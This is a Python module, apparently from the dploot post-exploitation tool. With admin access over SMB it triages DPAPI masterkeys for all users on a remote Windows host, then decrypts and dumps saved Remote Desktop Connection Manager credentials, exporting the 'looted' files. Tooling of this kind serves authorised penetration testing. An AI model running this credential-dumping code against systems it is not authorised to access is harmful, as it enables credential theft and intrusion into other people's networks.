import argparse
import logging
import os
import sys
from typing import Callable, Tuple
from dploot.action.masterkeys import add_masterkeys_argument_group, parse_masterkeys_options

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option, parse_file_as_list
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.rdg import RDGTriage

NAME = 'rdg'

class RDGAction:

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)
        
        self.conn = None
        self._is_admin = None
        self._users = None
        self.outputdir = None
        self.masterkeys = None
        self.pvkbytes = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_rdg)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        if self.is_admin:
            if self.masterkeys is None:
                masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                if not self.options.quiet: 
                    for masterkey in self.masterkeys:
                        masterkey.dump()
                    print()

            triage = RDGTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            logging.info('Triage RDCMAN Settings and RDG files for ALL USERS\n')
            rdcman_files, rdgfiles = triage.triage_rdcman()
            for rdcman_file in rdcman_files:
                if rdcman_file is None:
                    continue
                logging.debug("RDCMAN File: %s\n" %  (rdcman_file.filepath))
                for rdg_cred in rdcman_file.rdg_creds:
                    if self.options.quiet:
                        rdg_cred.dump_quiet()
                    else:
                        rdg_cred.dump()
            for rdgfile in rdgfiles:
                if rdgfile is None:
                    continue
                logging.debug("Found RDG file: %s\n" %  (rdgfile.filepath))
                for rdg_cred in rdgfile.rdg_creds:
                    if self.options.quiet:
                        rdg_cred.dump_quiet()
                    else:
                        rdg_cred.dump() 
            if self.outputdir is not None:
                for filename, bytes in triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = RDGAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Dump users saved password information for RDCMan.settings from remote target")

    group = subparser.add_argument_group("rdg options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=(
            "File containing {GUID}:SHA1 masterkeys mappings"
        ),
    )

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-export-rdg",
        action="store",
        metavar="DIR_RDG",
        help=(
            "Dump looted RDGMan.settings blob to specified directory, regardless they were decrypted"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry